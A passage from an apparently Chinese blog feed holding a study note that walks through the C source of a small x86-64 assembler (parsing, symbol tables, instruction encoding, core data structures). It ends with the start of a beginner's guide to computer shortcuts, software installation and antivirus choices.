id="read-all-asm-src-filepath"><a href="#read-all-asm-src-filepath" class="headerlink" title="read_all_asm(src, filepath);"></a>read_all_asm(src, filepath);</h2><blockquote><p>传入参数：char ret[]数组，原汇编文件。返回Vector</p></blockquote><h4 id="init-source-src-filepath"><a href="#init-source-src-filepath" class="headerlink" title="init_source(src, filepath);"></a>init_source(src, filepath);</h4><p>该函数首先分析了文件路径 .&#x2F;system.s 存在一个 Source source; 结构体中（这是一个全局结构体）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    int line, column;</span><br><span class="line">    Vector *line2length;</span><br><span class="line">    char *src;// ==汇编代码==</span><br><span class="line">    // example: &quot;/tmp/1.c&quot; -&gt; cwd: &quot;/tmp/&quot;</span><br><span class="line">    char *cwd;  // current working directory with &#x27;/&#x27;</span><br><span class="line">    char *filepath;</span><br><span class="line">&#125; Source;</span><br></pre></td></tr></table></figure><p>接下来是一个大循环，每一个循环分析一个汇编语句，比如第一个循环是 .global，再比如 mov %rdi, %rax。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while (speekch() != &#x27;\0&#x27;) &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>循环的第一部分是去掉类似注释的东西。</p></li><li><p>循环的第二部分是解析一个词语。分析char *str &#x3D; [read_asm_token();](# read_asm_token();)，返回比如 .global</p></li><li><p>接下来分析该词语的类别: label，标号提前处理。</p></li><li><p>接下来建立几个哈希表，分别把一系列汇编命令类别打进去，画风如下:（注意：这一部分只做一次，第二次循环开始KeyValue *map_insert(Map *map, const char *key, void *item)里的vector_push_back(map-&gt;data, kv);就不会再插入了）。</p></li><li><pre><code>Map *binop_table = new_map();map_insert(binop_table, &quot;mov&quot;, (void *)INST_MOV);map_insert(binop_table, &quot;movl&quot;, (void *)INST_MOVL);map_insert(binop_table, &quot;movsbl&quot;, (void *)INST_MOVSBL);map_insert(binop_table, &quot;movslq&quot;, (void *)INST_MOVSLQ);        ...Map *unary_table = new_map();map_insert(unary_table, &quot;push&quot;, (void *)INST_PUSH);map_insert(unary_table, &quot;pop&quot;, (void *)INST_POP);map_insert(unary_table, &quot;idiv&quot;, (void *)INST_IDIV);        ...<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">6. 一旦查到了就进入处理的部分！</span><br><span class="line"></span><br><span class="line">接下来分析一下详细处理的部分。</span><br><span class="line"></span><br></pre></td></tr></table></figure>if (kv = map_lookup(binop_table, str)) &#123;         Code *lhs = read_asm_param();         sexpect_ch(&#39;,&#39;);         Code *rhs = read_asm_param();         vector_push_back(code, new_binop_code((int)kv_value(kv), lhs, rhs));         continue;     &#125;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 先后两个 [read_asm_param()](#read_asm_param())分别分析左右操作数。</span><br><span class="line"></span><br><span class="line">2. 接着用 vector_push_back(code, new_binop_code((int)kv_value(kv), lhs, rhs));将其整合到一起。即将信息填充给第一个参数 code。我们从void vector_push_back(Vector *vec, void *item)的源码就可以看到填充过程。</span><br><span class="line"></span><br><span class="line">3. ```</span><br><span class="line">   void vector_push_back(Vector *vec, void *item)</span><br><span class="line">   &#123;</span><br><span class="line">       if (vec-&gt;data == NULL || vec-&gt;size == vec-&gt;rsved_size) &#123;</span><br><span class="line">           vec-&gt;rsved_size *= 2;</span><br><span class="line">           void **ndata = (void **)safe_malloc(sizeof(void *) * vec-&gt;rsved_size);</span><br><span class="line">           memcpy(ndata, vec-&gt;data, vec-&gt;size * sizeof(void *));</span><br><span class="line">           vec-&gt;data = ndata;</span><br><span class="line">       &#125;</span><br><span class="line">   </span><br><span class="line">       vec-&gt;data[vec-&gt;size++] = item;</span><br><span class="line">   &#125;</span><br><span class="line">   //这里的 vec参数就是传进来的code的地址.</span><br></pre></td></tr></table></figure></code></pre></li><li><p>continue;返回继续循环。</p></li></ol><blockquote><p>最后就是返回 Vector * code 。我们知道，每一个 code都是一个汇编语句的结构体。所以  Vector * code  就是整个结构体链，就类似于我们的TAC链条，至此可以得出结论:&#x3D;&#x3D;该函数的作用就是将源汇编代码转换成结构体链条&#x3D;&#x3D;</p></blockquote><p>over,返回上一层<a href="#read_asm_from_filepath(infile)">Vector *read_asm_from_filepath(char *filepath)</a>。</p><h2 id="read-asm-param"><a href="#read-asm-param" class="headerlink" title="read_asm_param();"></a>read_asm_param();</h2><blockquote><p>该函数总结来说就是分析一个汇编语句的其中一个操作数的内容。&#x3D;&#x3D;例如：mov %rax, %rdi&#x3D;&#x3D;的 %rax。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">switch (ch) &#123;</span><br><span class="line">        case &#x27;%&#x27;:</span><br><span class="line">            return str2reg(read_asm_token());</span><br><span class="line"></span><br><span class="line">        case &#x27;$&#x27;: &#123;</span><br><span class="line">            getch();  // already skipped space</span><br><span class="line">            return new_value_code(read_asm_ival());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case &#x27;(&#x27;:</span><br><span class="line">            return new_addrof_code(read_asm_memory(), 0);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>拿第一句来分析 ‘%’代表后面有寄存器。</p><p>​read_asm_token()函数：返回一个寄存器，例如 %rax，返回给str2reg(char *src);</p><p>​str2reg(char *src);里又是一系列哈希表打入操作，将寄存器们打入到Map,以下画风:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Map *map = new_map();</span><br><span class="line">map_insert(map, &quot;%al&quot;, nbyte_reg(1, 0));</span><br><span class="line">map_insert(map, &quot;%dil&quot;, nbyte_reg(1, 1));</span><br><span class="line">    map_insert(map, &quot;%sil&quot;, nbyte_reg(1, 2));</span><br><span class="line">    map_insert(map, &quot;%dl&quot;, nbyte_reg(1, 3));</span><br><span class="line">    map_insert(map, &quot;%cl&quot;, nbyte_reg(1, 4));</span><br><span class="line">    //其中nbyte_reg(1, 4))是Code类型的.</span><br></pre></td></tr></table></figure><p>​看看这个函数的返回值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return new_addrof_label_code(read_asm_memory(), label);</span><br></pre></td></tr></table></figure><p>而这个new_addrof_label_code函数返回的是Code*类型，因此就不难分析该函数最终完成了什么事情了。</p><blockquote><p>总结，该函数将指令的一个操作数存进了一个Code对象中并返回其地址。对了，Code对象定义如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">typedef struct Code Code;</span><br><span class="line">struct Code &#123;</span><br><span class="line">    int kind;</span><br><span class="line"></span><br><span class="line">    Code *lhs, *rhs;</span><br><span class="line">    int ival;</span><br><span class="line">    char *sval;  // size is ival</span><br><span class="line">    char *label;</span><br><span class="line">    Vector *read_dep;</span><br><span class="line">    int can_be_eliminated;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></blockquote><p>​</p><h2 id="read-asm-token"><a href="#read-asm-token" class="headerlink" title="read_asm_token();"></a>read_asm_token();</h2><p>首先建立一个 StringBuilder *sb &#x3D; new_string_builder();结构体</p><p>然后调用 string_builder_append(sb, sgetch());这个函数是分析每一个字符的。</p><p>后面有个循环就是分析每一个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while (1) &#123;</span><br><span class="line">        int ch = peekch();</span><br><span class="line">        if (!isalnum(ch) &amp;&amp; ch != &#x27;_&#x27; &amp;&amp; ch != &#x27;.&#x27; &amp;&amp; ch != &#x27;:&#x27;) break;</span><br><span class="line">        string_builder_append(sb, getch());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>&#x3D;&#x3D;最后返回一个词语，比如 .global&#x3D;&#x3D;</p></blockquote><h2 id="assemble-code-code"><a href="#assemble-code-code" class="headerlink" title="assemble_code(code);"></a>assemble_code(code);</h2><h2 id="SymbolInfo-get-symbol-info-char-label"><a href="#SymbolInfo-get-symbol-info-char-label" class="headerlink" title="SymbolInfo *get_symbol_info(char *label)"></a>SymbolInfo *get_symbol_info(char *label)</h2><p>传进来的其实是标号 ，返回类型 SymbolInfo * 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    int index;</span><br><span class="line">    char *label;</span><br><span class="line">    int st_name;</span><br><span class="line">    int st_info;</span><br><span class="line">&#125; SymbolInfo;</span><br></pre></td></tr></table></figure><p>接下来定义了一个 SymbolInfo *symbol 并进行了赋值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SymbolInfo *symbol = (SymbolInfo *)safe_malloc(sizeof(SymbolInfo));</span><br><span class="line">    symbol-&gt;index = vector_size(target_objimg-&gt;symtab) + 4;</span><br><span class="line">    symbol-&gt;label = label;</span><br><span class="line">    symbol-&gt;st_name = vector_size(target_objimg-&gt;strtab);</span><br><span class="line">    symbol-&gt;st_info = 0;</span><br></pre></td></tr></table></figure><p>最后的三个函数，暂时没法分析，哈哈。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add_string(target_objimg-&gt;strtab, label, strlen(label) + 1);</span><br><span class="line">map_insert(target_objimg-&gt;symbol_map, label, symbol);</span><br><span class="line">vector_push_back(target_objimg-&gt;symtab, symbol);</span><br></pre></td></tr></table></figure><blockquote><p>行，返回上面那个SymbolInfo *symbol ，完事。</p></blockquote><h2 id="ObjectImage-assemble-code-detail-Vector-code-list"><a href="#ObjectImage-assemble-code-detail-Vector-code-list" class="headerlink" title="ObjectImage *assemble_code_detail(Vector *code_list);"></a>ObjectImage *assemble_code_detail(Vector *code_list);</h2><blockquote><p>这里接收一个 Vector* 的参数，参数的size就是汇编代码的条数，实际上也是该链表的节点数。</p></blockquote><p>该函数有一个很重要的局部变量就是ObjectImage *objimg</p><blockquote><p>第一句就有ObjectImage *objimg &#x3D; (ObjectImage *)safe_malloc(sizeof(ObjectImage));</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct ObjectImage &#123;</span><br><span class="line">    Vector *text;    // vector&lt;int&gt;</span><br><span class="line">    Vector *data;    // vector&lt;int&gt;</span><br><span class="line">    Vector *rela;    // vector&lt;RelaEntry *&gt;</span><br><span class="line">    Vector *strtab;  // vecotr&lt;int&gt;</span><br><span class="line">    Vector *symtab;  // vector&lt;SymbolInfo *&gt;</span><br><span class="line"></span><br><span class="line">    Map *symbol_map;    // map&lt;char *, SymbolInfo *&gt;</span><br><span class="line">    Map *label2offset;  // map&lt;char *, SectionOffset&gt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></blockquote><p>接下来便是给objimg的每一个成员malloc内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">objimg-&gt;text = new_vector();</span><br><span class="line">objimg-&gt;data = new_vector();</span><br><span class="line">objimg-&gt;rela = new_vector();</span><br><span class="line">objimg-&gt;strtab = new_vector();</span><br><span class="line">vector_push_back(objimg-&gt;strtab, 0x00);</span><br><span class="line">objimg-&gt;symtab = new_vector();</span><br><span class="line">objimg-&gt;symbol_map = new_map();</span><br><span class="line">objimg-&gt;label2offset = new_map();</span><br></pre></td></tr></table></figure><p>接下来的init_target_objimg(objimg);很简单，就是造一个全局对象 ObjectImage * target_objimg，然后把上面的赋过去。set_current_section(TEXT_SECTION);同样设置一个全局current_section并得到赋值。</p><blockquote><p>在这里请务必注意有全局和局部两个 objimg。</p></blockquote><blockquote><p>&#x3D;&#x3D;接下来的这个for循环就是分析每一个节点了&#x3D;&#x3D;</p></blockquote><ol><li><p>首先<code>Code *code = vector_get(code_list, i);</code>便是获取该节点。</p></li><li><p>举个例子，第二句汇编<code>syscall:</code></p><p><img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221116012713779.png" alt="image-20221116012713779"></p></li><li><p>接下来 switch (code-&gt;kind)。</p><p>比如第一句是 .global 跳转到836行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">case CD_GLOBAL:</span><br><span class="line">                get_symbol_info(code-&gt;label)-&gt;st_info |= 0x10;</span><br><span class="line">                break;</span><br></pre></td></tr></table></figure><p>浅浅分析一下下面的函数 [get_symbol_info(code-&gt;label)](#SymbolInfo *get_symbol_info(char *label))。</p><p>上面那个真难分析，咱们来分析一个mov语句看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">case INST_MOV:</span><br><span class="line">if (is_reg64(code-&gt;lhs) &amp;&amp; is_reg64(code-&gt;rhs)) &#123;</span><br><span class="line">                    emit_byte(rex_prefix_reg_ext(1, code-&gt;lhs, code-&gt;rhs));</span><br><span class="line">                    emit_byte(0x89);</span><br><span class="line">                    emit_byte(</span><br><span class="line">                        modrm(3, reg_field(code-&gt;lhs), reg_field(code-&gt;rhs)));</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><p>首先case里面的很多if语句，其实是分析mov语句的操作数类型的，如下面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (is_reg64(code-&gt;lhs) &amp;&amp; is_reg64(code-&gt;rhs))&#123;&#125;</span><br><span class="line">if (is_reg32(code-&gt;lhs) &amp;&amp; is_reg32(code-&gt;rhs))&#123;&#125;</span><br><span class="line">if (is_imm(code-&gt;lhs) &amp;&amp; is_reg32(code-&gt;rhs))&#123;&#125;</span><br><span class="line">if (is_addrof(code-&gt;lhs) &amp;&amp; is_reg64(code-&gt;rhs))&#123;&#125;</span><br><span class="line">if (is_reg8(code-&gt;lhs) &amp;&amp; is_addrof(code-&gt;rhs))&#123;&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>例如第一句 mov %rdi, %rax 显然应该进入第一个if语句。</p><p>if里面实际上是三个emit_byte函数，这里面实际上是另一个函数add_byte。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">emit_byte(rex_prefix_reg_ext(1, code-&gt;lhs, code-&gt;rhs));</span><br><span class="line">emit_byte(0x89);</span><br><span class="line">emit_byte(modrm(3, reg_field(code-&gt;lhs), reg_field(code-&gt;rhs)));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void emit_byte(int val0) &#123; add_byte(buffer_to_emit, val0); &#125;</span><br></pre></td></tr></table></figure><p>这里的buffer_to_emit是一个全局的结构体，有定义过：Vector *buffer_to_emit &#x3D; NULL;</p><p>讲道理，这里没那么好分析，因为主要都是涉及到数字的位运算。</p><blockquote><p>从这里大致推断，&#x3D;&#x3D;实际上是在填充全局的 Vector *buffer_to_emit。&#x3D;&#x3D;</p></blockquote></li></ol><p>接下来的一个 for 循环时涉及到 symtab 节的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for (int i = 0; i &lt; vector_size(target_objimg-&gt;symtab); i++) &#123;</span><br><span class="line">        SymbolInfo *sym = (SymbolInfo *)vector_get(target_objimg-&gt;symtab, i);</span><br><span class="line">        if (map_lookup(target_objimg-&gt;label2offset, sym-&gt;label) == NULL)</span><br><span class="line">            sym-&gt;st_info |= 0x10;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再接下来分析那个 objimg-&gt;rela。</p><p>最后 set_current_section(TEXT_SECTION);以及分析label_placeholders。注释很关键：&#x2F;&#x2F; write offset to label placeholders。</p><blockquote><p>最后，返回 ObjectImage *objimg。主函数使用ObjectImage *obj &#x3D; assemble_code(code);进行接收。其实可以从调试看出很多信息。ok,返回！</p></blockquote><h2 id="dump-object-image-obj-fh"><a href="#dump-object-image-obj-fh" class="headerlink" title="dump_object_image(obj, fh);"></a>dump_object_image(obj, fh);</h2><blockquote><p>该函数接收两个参数，其一为前面的 ObjectImage *obj ，它存储了所有的段表及符号信息，其二便是目标文件指针。</p></blockquote><p>第一个函数 init_target_objimg(objimg);同样为了初始化 ObjectImage *target_objimg &#x3D; objimg;的全局对象。</p><p>第二个函数 set_buffer_to_emit(dumped);同样为了初始化 Vector *buffer_to_emit &#x3D; buffer; 的全局对象。</p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><p>该项目均采用vector数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Vector</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> size, rsved_size;</span><br><span class="line">    <span class="type">void</span> **data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="KeyValue"><a href="#KeyValue" class="headerlink" title="KeyValue"></a>KeyValue</h3><p>key存字符串</p><p>value存对应的值，用于匹配查询</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">KeyValue</span> &#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *key;</span><br><span class="line">    <span class="type">void</span> *value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Map</span> &#123;</span></span><br><span class="line">    Vector *data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">StringBuilder</span> &#123;</span></span><br><span class="line">    Vector *data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p>src用于存储输入的汇编文件</p><p>line和cloumn表示正在处理的行列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> line, column;</span><br><span class="line">    Vector *line2length;</span><br><span class="line">    <span class="type">char</span> *src;</span><br><span class="line">    <span class="comment">// example: &quot;/tmp/1.c&quot; -&gt; cwd: &quot;/tmp/&quot;</span></span><br><span class="line">    <span class="type">char</span> *cwd;  <span class="comment">// current working directory with &#x27;/&#x27;</span></span><br><span class="line">    <span class="type">char</span> *filepath;</span><br><span class="line">&#125; Source;</span><br></pre></td></tr></table></figure><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><p>用于存储汇编指令</p><p>lhs表示左操作数，rhs表示右操作数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Code</span> <span class="title">Code</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Code</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> kind;</span><br><span class="line"></span><br><span class="line">    Code *lhs, *rhs;</span><br><span class="line">    <span class="type">int</span> ival;</span><br><span class="line">    <span class="type">char</span> *sval;  <span class="comment">// size is ival</span></span><br><span class="line">    <span class="type">char</span> *label;</span><br><span class="line">    Vector *read_dep;</span><br><span class="line">    <span class="type">int</span> can_be_eliminated;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ObjectImage"><a href="#ObjectImage" class="headerlink" title="ObjectImage"></a>ObjectImage</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectImage</span> &#123;</span></span><br><span class="line">    Vector *text;    <span class="comment">// vector&lt;int&gt;</span></span><br><span class="line">    Vector *data;    <span class="comment">// vector&lt;int&gt;</span></span><br><span class="line">    Vector *rela;    <span class="comment">// vector&lt;RelaEntry *&gt;</span></span><br><span class="line">    Vector *strtab;  <span class="comment">// vecotr&lt;int&gt;</span></span><br><span class="line">    Vector *symtab;  <span class="comment">// vector&lt;SymbolInfo *&gt;</span></span><br><span class="line"></span><br><span class="line">    Map *symbol_map;    <span class="comment">// map&lt;char *, SymbolInfo *&gt;</span></span><br><span class="line">    Map *label2offset;  <span class="comment">// map&lt;char *, SectionOffset&gt;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> General Records </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>萌新电脑操作技巧</title>
      <link href="/2021/07/31/G01_hello_world/"/>
      <url>/2021/07/31/G01_hello_world/</url>
      
        <content type="html"><![CDATA[<blockquote><p>​写给大一的同学 —– 对于我们专业的同学们来说电脑是经常接触到的，就正如我们的桌面一样，保持电脑的干净整洁，不仅能让心情愉快，还能提高工作效率。<br><br/>几年前家里那台老台式机，充斥着各种弹窗广告，c盘被挤满，好几个杀毒软件养蛊，浏览器被篡改，这些都使得这台电脑速度慢，频繁卡顿，安全性低，不整洁。或许你也并不希望在敲码,玩游戏或追剧正尽兴时忽然冒出一个砍一刀999级的广告，因此根据我的一些经历在这里写了一些关于保养电脑的想法。持续更新一段时间。<br><br/>当然知识受限，如果有错误或不完备的还请你多多指教，谢谢啦。</p></blockquote><center>Latest Version：2021/8/6 - 11：30</center><hr><h2 id="快捷按键"><a href="#快捷按键" class="headerlink" title=" 快捷按键"></a><img src="https://i.loli.net/2021/08/02/xaeHiozfsJXCjbS.png" alt="key.png"> 快捷按键</h2><blockquote><p>经常使用电脑的同学有必要知道某些使用频率高的快捷键，这有帮助于提高操作效率。</p></blockquote><h3 id="文档编辑类"><a href="#文档编辑类" class="headerlink" title="文档编辑类"></a>文档编辑类</h3><ul><li>CTRL + C&#x2F;V 复制(Copy)&#x2F;粘贴(Paste)</li><li>CTRL + A 全选(All)</li><li>CTRL + Z 撤销(Unmake)</li><li>CTRL + X 剪贴</li><li>CTRL + S 保存(Save)</li><li>CTRL + Y 反撤销</li><li>win +  V 打开剪贴板</li><li>CTRL + 鼠标滚轮 网页等放大缩小</li><li>CTRL + ALT + A （QQ登录时）截屏</li><li>CTRL + N　新建（New）</li></ul><h3 id="电脑操作类"><a href="#电脑操作类" class="headerlink" title="电脑操作类"></a>电脑操作类</h3><ul><li>CTRL + SHIFT + ESC　打开任务管理器<br/><br>   ps.尤其是电脑出现软件卡死时打开任务管理器，右键单击该软件可以强制退出；当电脑莫名卡顿时也可以通过查看CPU占用比异常高的后台程序通过上网搜索寻求解放方案。（但后台和进程程序最好不要擅自强制关闭）</li><li>触摸板三指左右滑  切换任务界面</li><li>触摸板三指上下滑  返回页面&#x2F;返回桌面</li></ul><h2 id="使用技巧"><a href="#使用技巧" class="headerlink" title=" 使用技巧"></a><img src="https://i.loli.net/2021/08/02/voMhIB371X9Zlmy.png" alt="aa.png"> 使用技巧</h2><h3 id="关于电脑使用"><a href="#关于电脑使用" class="headerlink" title="关于电脑使用"></a>关于电脑使用</h3><ol><li>电脑在哪里买：首选京东，天猫苏宁等官方旗舰店，一定不要去电脑城，线下的品牌专卖店比电脑城好些，但也不太推荐。</li><li>买的新电脑第一次开机不要急着联网，点击跳过，先检查好没问题再联网激活，否则会激活Windows就不能退了.</li><li>笔记本电脑需要散热，一般底部有进风口，侧边有出风口，所以要注意不要把风口堵住了。比如不要把笔记本直接放在被子上操作，待会燃起来了qwq.</li><li>硬盘分区。如果有512G或1T的固态硬盘最好分以下区哦，分成D:和E:两个盘，便于文件管理，例如D:放软件，E：放资料。分区方法可以搜一下。</li></ol><h3 id="关于软件安装"><a href="#关于软件安装" class="headerlink" title="关于软件安装"></a>关于软件安装</h3><ol><li>下载地点：最好选择官网，(一定看清楚哦，很多时候百度出来的位置靠前一两个的并不是官网)或者正规软件商店，不要选择百度里的非官方渠道，避免不兼容或捆绑病毒。</li><li>下载方式：先选择&lt;另存为&gt;到桌面，下载完安装包后桌面点击运行，等软件安装完毕后直接将桌面上的安装包拖进回收站。</li><li>点开安装包后，不要一直点击下一步，选择&lt;自定义安装&gt;而不是&lt;快速安装&gt;！因为如果有捆绑软件此时需要叉掉，并且不要安装到默认c盘，此时建议在D盘新建一个文件夹，然后将该软件安装到这个新建的文件夹里。</li></ol><p><img src="https://i.loli.net/2021/08/01/OtxwUqCyvgfPWJT.png" alt="QQ图片20210801153229.png"></p><h3 id="关于软件卸载"><a href="#关于软件卸载" class="headerlink" title="关于软件卸载"></a>关于软件卸载</h3><ul><li>卸载我推荐一个软件叫做 Geek Uninstaller <a href="https://geekuninstaller.com/">官网链接</a>,因为大多卸载方式存在文件残留以及注册表信息存留，此款软件无广告，轻量而且操作方便，推荐安装。</li></ul><h3 id="关于杀毒软件"><a href="#关于杀毒软件" class="headerlink" title="关于杀毒软件"></a>关于杀毒软件</h3><ul><li>事实上windows电脑自带Windows defender能够有防护效果，所以通常来讲电脑并不需要额外安装杀毒软件。不建议安装360，腾讯电脑管家等等，这些软件可能会占后台，篡改浏览器主页等等。如果实在想安装杀毒软件，火绒安全还不错。</li></ul><h3 id="关于文件分类"><a href="#关于文件分类" class="headerlink" 